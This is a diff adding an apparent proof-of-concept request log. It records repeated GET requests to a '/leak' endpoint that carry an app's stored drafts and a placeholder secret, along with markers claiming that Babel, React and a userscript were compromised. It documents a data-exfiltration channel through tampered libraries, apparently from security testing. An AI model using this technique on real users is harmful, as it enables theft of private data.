@@ -1,0 +1,12 @@
+{"ts":"2026-10-16T16:52:26.434Z","method":"GET","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D","body":""}
+{"ts":"2026-10-16T16:53:17.072Z","method":"GET","path":"/leak?babel=compromised","body":""}
+{"ts":"2026-10-16T16:53:17.348Z","method":"GET","path":"/leak?userscript=via-tampered-babel","body":""}
+{"ts":"2026-10-16T16:53:20.824Z","method":"GET","path":"/leak?react=compromised","body":""}
+{"ts":"2026-10-16T16:56:05.206Z","method":"GET","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D","body":""}
+{"ts":"2026-10-16T16:57:01.446Z","method":"GET","path":"/leak?babel=compromised","body":""}
+{"ts":"2026-10-16T16:57:01.722Z","method":"GET","path":"/leak?userscript=via-tampered-babel","body":""}
+{"ts":"2026-10-16T16:57:05.334Z","method":"GET","path":"/leak?react=compromised","body":""}
+{"ts":"2026-10-17T13:15:28.813Z","method":"GET","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D","body":""}
+{"ts":"2026-10-17T13:16:15.150Z","method":"GET","path":"/leak?babel=compromised","body":""}
+{"ts":"2026-10-17T13:16:15.425Z","method":"GET","path":"/leak?userscript=via-tampered-babel","body":""}
+{"ts":"2026-10-17T13:16:18.858Z","method":"GET","path":"/leak?react=compromised","body":""}
